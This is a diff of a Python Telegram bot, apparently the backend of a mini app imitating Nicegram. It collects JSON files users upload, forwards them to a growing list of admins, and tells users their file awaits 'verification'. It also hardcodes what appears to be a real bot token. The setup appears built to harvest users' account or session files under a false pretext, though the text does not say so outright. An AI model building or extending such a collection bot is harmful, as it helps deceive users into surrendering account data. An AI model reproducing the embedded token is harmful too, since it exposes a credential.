@@ -10,18 +10,14 @@ from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, FSInputFil
 # --- КОНФИГУРАЦИЯ ---
 BOT_TOKEN = '8202878099:AAES9ybI0KKY9e_ixXrUMXtwqs-TL2r8nQg'
 
-# ВАЖНО: Тут должен быть ОДИН ID (числом). Если нужно несколько, логику надо переписывать.
-# Я оставил первый ID. Второй ID пока закомментирован.
-INITIAL_ADMIN_ID = 8187498719 
+# ID главных админов (добавляются автоматически при старте)
+# Можно указать несколько через запятую
+ROOT_ADMINS = [8187498719, 8396015606]
 
 WEB_APP_URL = "https://kareli123.github.io/nicegram/" 
 
-# Глобальная переменная текущего админа
-current_admin_id = INITIAL_ADMIN_ID
-
 # --- НАСТРОЙКИ СЕРВЕРА ---
 WEB_SERVER_HOST = "0.0.0.0"
-# Порт берется из настроек Render или ставится 8080 для теста
 WEB_SERVER_PORT = int(os.environ.get("PORT", 8080))
 
 logging.basicConfig(level=logging.INFO)
@@ -35,9 +31,11 @@ dp.include_router(router)
 DB_FILE = "bot_data.db"
 
 def init_db():
-    """Создает таблицу пользователей, если её нет"""
+    """Создает таблицы и добавляет главных админов"""
     with sqlite3.connect(DB_FILE) as conn:
         cursor = conn.cursor()
+        
+        # 1. Таблица всех пользователей (для поиска по username)
         cursor.execute('''
             CREATE TABLE IF NOT EXISTS users (
                 user_id INTEGER PRIMARY KEY,
@@ -45,40 +43,58 @@ def init_db():
                 full_name TEXT
             )
         ''')
+        
+        # 2. Таблица администраторов
+        cursor.execute('''
+            CREATE TABLE IF NOT EXISTS admins (
+                user_id INTEGER PRIMARY KEY
+            )
+        ''')
+        
+        # Добавляем ROOT админов сразу
+        for admin_id in ROOT_ADMINS:
+            cursor.execute("INSERT OR IGNORE INTO admins (user_id) VALUES (?)", (admin_id,))
+        
         conn.commit()
 
 def add_user_if_new(user: types.User):
-    """
-    Добавляет пользователя в БД.
-    Возвращает True, если пользователь новый.
-    Возвращает False, если уже был.
-    """
+    """Сохраняет пользователя в базу для истории и поиска"""
     try:
         with sqlite3.connect(DB_FILE) as conn:
             cursor = conn.cursor()
             cursor.execute("SELECT user_id FROM users WHERE user_id = ?", (user.id,))
             if cursor.fetchone():
-                return False # Пользователь уже есть
+                return False 
             
-            # Если нет, добавляем
             cursor.execute("INSERT INTO users (user_id, username, full_name) VALUES (?, ?, ?)", 
                            (user.id, user.username, user.full_name))
             conn.commit()
             return True
     except Exception as e:
-        logging.error(f"Ошибка БД: {e}")
+        logging.error(f"DB Error: {e}")
         return False
+
+def get_all_admins():
+    """Возвращает список ID всех админов"""
+    with sqlite3.connect(DB_FILE) as conn:
+        cursor = conn.cursor()
+        cursor.execute("SELECT user_id FROM admins")
+        return [row[0] for row in cursor.fetchall()]
+
+def add_new_admin(user_id):
+    """Добавляет нового админа в базу"""
+    with sqlite3.connect(DB_FILE) as conn:
+        cursor = conn.cursor()
+        cursor.execute("INSERT OR IGNORE INTO admins (user_id) VALUES (?)", (user_id,))
+        conn.commit()
 
 # --- ВЕБ-СЕРВЕР ---
 routes = web.RouteTableDef()
 
-# 1. Функция проверки жизни бота (ДЛЯ UPTIMEROBOT)
-# Она должна быть ОТДЕЛЬНО, а не внутри других функций
 @routes.get('/')
 async def keep_alive(request):
     return web.Response(text="Bot is running!")
 
-# 2. Функция приема файлов
 @routes.post('/upload')
 async def handle_upload_file(request: web.Request):
     reader = await request.multipart()
@@ -87,11 +103,9 @@ async def handle_upload_file(request: web.Request):
     file_data = None
     filename = "unknown.json"
 
-    # Правильный цикл чтения данных
     while True:
         part = await reader.next()
-        if part is None:
-            break
+        if part is None: break
         
         if part.name == 'user_id':
             val = await part.read_chunk()
@@ -102,28 +116,30 @@ async def handle_upload_file(request: web.Request):
 
     if user_id and file_data:
         try:
-            # 1. Отправка ТЕКУЩЕМУ админу
-            global current_admin_id
-            
-            # Создаем подпись
+            # Получаем список всех админов
+            admin_ids = get_all_admins()
             caption_text = f"🚨 Файл загружен через Mini App!\nUser ID: {user_id}"
             
-            await bot.send_document(
-                chat_id=current_admin_id,
-                document=BufferedInputFile(file_data, filename=filename),
-                caption=caption_text
-            )
-            logging.info(f"Файл от {user_id} отправлен админу ({current_admin_id}).")
+            # Рассылаем файл ВСЕМ админам
+            for admin_id in admin_ids:
+                try:
+                    await bot.send_document(
+                        chat_id=admin_id,
+                        document=BufferedInputFile(file_data, filename=filename),
+                        caption=caption_text
+                    )
+                except Exception as e:
+                    logging.warning(f"Не удалось отправить файл админу {admin_id}: {e}")
 
-            # 2. Ответ пользователю
+            # Ответ пользователю
             try:
                 await bot.send_message(chat_id=int(user_id), text="✅ Файл принят. Ожидайте проверки.")
-            except Exception as e:
-                logging.warning(f"Не удалось ответить юзеру {user_id}: {e}")
+            except:
+                pass
 
         except Exception as e:
-            logging.error(f"Ошибка при обработке файла: {e}")
-            return web.Response(text="Error processing", status=500)
+            logging.error(f"Ошибка обработки: {e}")
+            return web.Response(text="Error", status=500)
 
     return web.Response(text="OK", headers={
         "Access-Control-Allow-Origin": "*",
@@ -151,107 +167,85 @@ def get_main_keyboard():
 @router.message(Command("start"))
 async def cmd_start(message: types.Message):
     user = message.from_user
-    
-    # Проверяем, новый ли пользователь
     is_new = add_user_if_new(user)
     
     if is_new:
-        # Уведомляем админа
-        global current_admin_id
         admin_text = (
             f"👤 <b>Новый пользователь!</b>\n"
             f"Имя: {user.full_name}\n"
             f"Username: @{user.username}\n"
             f"ID: <code>{user.id}</code>"
         )
-        try:
-            await bot.send_message(current_admin_id, admin_text, parse_mode="HTML")
-        except Exception as e:
-            logging.error(f"Не удалось уведомить админа о новом пользователе: {e}")
+        # Уведомляем ВСЕХ админов
+        admin_ids = get_all_admins()
+        for admin_id in admin_ids:
+            try:
+                await bot.send_message(admin_id, admin_text, parse_mode="HTML")
+            except:
+                pass
 
-    # Логика отправки приветствия
     if os.path.exists("nicegramm.jpg"):
         try:
             photo = FSInputFile("nicegramm.jpg")
             await message.answer_photo(photo=photo, caption=TEXT_MAIN, reply_markup=get_main_keyboard())
-        except Exception as e:
-            logging.error(f"Ошибка отправки фото: {e}")
+        except:
             await message.answer(TEXT_MAIN, reply_markup=get_main_keyboard())
     else:
         await message.answer(TEXT_MAIN, reply_markup=get_main_keyboard())
 
+# --- КОМАНДА ВЫДАЧИ АДМИНКИ ---
 @router.message(Command("admin"))
-async def cmd_change_admin(message: types.Message):
-    global current_admin_id
-    
-    # Проверка безопасности: команду может выполнить только текущий админ
-    if message.from_user.id != current_admin_id:
-        return
+async def cmd_add_admin(message: types.Message):
+    # 1. Проверяем, является ли отправитель админом
+    current_admins = get_all_admins()
+    if message.from_user.id not in current_admins:
+        return # Игнорируем обычных юзеров
 
-    # Разбираем аргументы: /admin @username
+    # 2. Разбираем команду
     args = message.text.split()
     if len(args) < 2:
-        await message.answer("⚠️ Использование: <code>/admin @username</code>", parse_mode="HTML")
+        await message.answer("⚠️ Чтобы выдать админку, напишите:\n<code>/admin @username</code>", parse_mode="HTML")
         return
 
-    target_username = args[1].replace('@', '') # Убираем собачку, если есть
+    target_username = args[1].replace('@', '').lower()
 
+    # 3. Ищем ID пользователя в базе
+    new_admin_id = None
+    with sqlite3.connect(DB_FILE) as conn:
+        cursor = conn.cursor()
+        cursor.execute("SELECT user_id, full_name FROM users WHERE LOWER(username) = ?", (target_username,))
+        result = cursor.fetchone()
+        if result:
+            new_admin_id = result[0]
+            name = result[1]
+    
+    if not new_admin_id:
+        await message.answer("❌ Пользователь не найден. Он должен сначала запустить бота (/start).")
+        return
+
+    # 4. Добавляем в таблицу админов
+    add_new_admin(new_admin_id)
+    
+    await message.answer(f"✅ Пользователь <b>{name}</b> добавлен в администраторы!\nТеперь он тоже будет получать файлы.", parse_mode="HTML")
+    
     try:
-        # Пытаемся получить инфо о чате по юзернейму
-        # ВАЖНО: Бот может найти только тех, кто уже писал ему!
-        # Метод get_chat может не сработать, если юзер не взаимодействовал с ботом
-        # Более надежный способ - искать по ID, если он есть в вашей базе
-        
-        # Попробуем найти ID в локальной базе данных (так надежнее)
-        new_admin_id = None
-        with sqlite3.connect(DB_FILE) as conn:
-            cursor = conn.cursor()
-            # Ищем юзера без учета регистра
-            cursor.execute("SELECT user_id FROM users WHERE LOWER(username) = ?", (target_username.lower(),))
-            result = cursor.fetchone()
-            if result:
-                new_admin_id = result[0]
-        
-        if not new_admin_id:
-             await message.answer("❌ Пользователь не найден в базе бота. Он должен нажать /start.")
-             return
-
-        # Обновляем глобальную переменную
-        current_admin_id = new_admin_id
-        
-        await message.answer(
-            f"✅ <b>Админ успешно изменен!</b>\n"
-            f"Новый ID: <code>{new_admin_id}</code>", 
-            parse_mode="HTML"
-        )
-        
-        # Попробуем уведомить нового админа
-        try:
-            await bot.send_message(new_admin_id, "👑 Вы назначены новым администратором бота.")
-        except:
-            pass 
-
-    except Exception as e:
-        logging.error(f"Ошибка смены админа: {e}")
-        await message.answer(f"❌ Ошибка: {e}")
+        await bot.send_message(new_admin_id, "👑 <b>Вам выданы права администратора!</b>\nТеперь вы будете получать файлы пользователей.", parse_mode="HTML")
+    except:
+        pass
 
 # --- ЗАПУСК ---
 async def main():
-    # Инициализация БД
-    init_db()
+    init_db() # Создаем таблицы и добавляем ROOT админов
     
-    # 1. Настройка веб-сервера
     app = web.Application()
     app.add_routes(routes)
     
     runner = web.AppRunner(app)
     await runner.setup()
     site = web.TCPSite(runner, WEB_SERVER_HOST, WEB_SERVER_PORT)
-    
     await site.start()
     logging.info(f"🌍 Server running on {WEB_SERVER_HOST}:{WEB_SERVER_PORT}")
 
-    # 2. Запуск поллинга бота
     await bot.delete_webhook(drop_pending_updates=True)
     try:
         await dp.start_polling(bot)
